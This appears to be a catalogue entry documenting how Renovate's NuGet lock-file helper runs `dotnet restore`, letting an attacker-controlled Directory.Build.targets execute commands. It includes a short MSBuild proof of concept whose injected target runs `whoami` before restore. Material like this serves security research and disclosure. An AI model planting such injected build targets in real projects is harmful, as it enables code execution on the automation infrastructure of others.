---
title: Renovate
tags:
  - cli
  - input-file
  - eval-sh
files: ["*.csproj", packages.lock.json, Directory.Build.targets]
references:
  - https://docs.renovatebot.com/modules/manager/nuget/
  - https://github.com/renovatebot/renovate/blob/432153f71f127c9258d0174447a89fb3c3d23d03/lib/modules/manager/nuget/artifacts.ts
---

Renovate's NuGet artifact-generation helper invokes `dotnet restore` to update lock files.

## `Directory.Build.targets`

An attacker controlling a processed project or its imports can execute a restore hook:

```xml
<Project>
  <Target Name="Injected" BeforeTargets="Restore">
    <Exec Command="whoami" />
  </Target>
</Project>
```

With an existing tracked `packages.lock.json`, dependency changes or active lock-file maintenance can reach this command:

```console
dotnet restore App.csproj --force-evaluate --configfile <generated-private-nuget.config>
```

The sandbox calls the published `updateArtifacts` helper, not a full hosted Renovate job. No administrator `postUpgradeTasks` permission is required for this restore path.
